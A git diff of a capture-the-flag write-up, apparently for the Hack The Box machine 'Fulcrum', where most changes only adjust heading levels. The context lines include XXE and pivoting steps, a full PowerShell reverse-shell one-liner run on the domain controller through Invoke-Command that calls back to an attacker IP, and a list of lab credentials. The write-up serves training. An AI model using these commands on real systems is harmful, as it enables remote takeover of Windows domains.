@@ -5,7 +5,7 @@
 ```
 If Active Directory => [[Synchronize NTP]] with the domain controller.
 
-# Content
+### Content
 
 - "API Enumeration - Endpoint Brute Force
 - Advanced XXE Exploitation (XML External Entity Injection)
@@ -27,7 +27,7 @@ If Active Directory => [[Synchronize NTP]] with the domain controller.
 - Information Leakage - Domain Admin Password
 - PIVOTING 3 - Using Invoke-Command to execute commands on the Domain Controller (DC)
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -200,7 +200,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 00:58:12.112944 IP 10.10.10.62.56423 > 10.10.14.3.60996: ...
 ```
 
-# Exploitation
+### Exploitation
 
 If we try with XML payload and we provide the parameter Ping this is what happens:
 ![[Pasted image 20230205190544.png]]
@@ -782,7 +782,7 @@ PS C:\Users\BTables\Documents> PS C:\Users\BTables\Documents> whoami
 fulcrum\btables
 ```
 
-# Root privesc
+### Privilege Escalation
 Now that we are inside the file.fulcrum.local device, we can enumerate SMB Shares within the machine: ^cae2ef
 ```bash
 PS C:\Users\BTables\Desktop> Get-SMBShare
@@ -864,13 +864,13 @@ We get RCE, so let's retrieve the flag:
 ```bash
 Invoke-Command -ComputerName dc.fulcrum.local -Credential $Creds -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
 ```
-# Post Exploitation
+### Post Exploitation
 We can get a reverse shell directly into the DC with the following command:
 ```bash
 Invoke-Command -ComputerName dc.fulcrum.local -Credential $Creds -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
 ```
 
-# Credentials
+### Credentials
 ```bash
 # To login into the 192.168.122.228 machine via chisel->WinRM
 WebUser:M4ng£m£ntPa55
@@ -883,7 +883,7 @@ BTables:++FileServerLogon12345++
 
 ```
 
-# Resources:
+### References
 
 * [Finding and exploiting blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind)
 
